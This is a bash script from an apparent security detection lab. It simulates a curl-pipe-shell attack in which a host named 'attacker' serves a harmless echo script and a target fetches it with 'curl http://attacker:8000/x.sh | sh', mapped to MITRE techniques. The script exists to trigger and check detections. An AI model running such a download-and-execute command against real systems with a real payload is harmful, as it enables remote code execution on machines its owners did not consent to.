#!/usr/bin/env bash
# LAB ONLY. Simulates a curl | sh download-and-execute. The attacker serves a harmless
# script (it only echoes) with python3's http.server on port 8000. target1 fetches and
# runs it. Idempotent: restarts the server on every run.
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/_lib.sh"

banner "07 curl | sh" \
  "target1 runs: curl http://attacker:8000/x.sh | sh (the script only echoes)" \
  "T1105 Command and Control: Ingress Tool Transfer; T1059.004 Execution: Unix Shell"

require_up attacker target1

run_in attacker sh -c 'mkdir -p /srv/aegis-payload && cat > /srv/aegis-payload/x.sh <<"EOF"
#!/bin/sh
echo "aegis-lab benign payload executed on $(hostname)"
EOF
chmod 644 /srv/aegis-payload/x.sh'

run_in attacker sh -c "pkill -f '[h]ttp.server 8000' 2>/dev/null || true"
bg_in attacker sh -c 'cd /srv/aegis-payload && exec python3 -m http.server 8000 --bind 0.0.0.0 >/tmp/aegis-http.log 2>&1 </dev/null'

echo "Waiting for the payload server ..."
for _ in $(seq 1 15); do
  if run_in attacker curl -fsS -o /dev/null http://127.0.0.1:8000/x.sh; then
    break
  fi
  sleep 1
done

echo "[target1] curl http://attacker:8000/x.sh | sh"
run_in target1 sh -c 'curl -fsS http://attacker:8000/x.sh | sh'

echo "Done. Expect a curl-pipe-shell detection on target1 and a network anomaly."
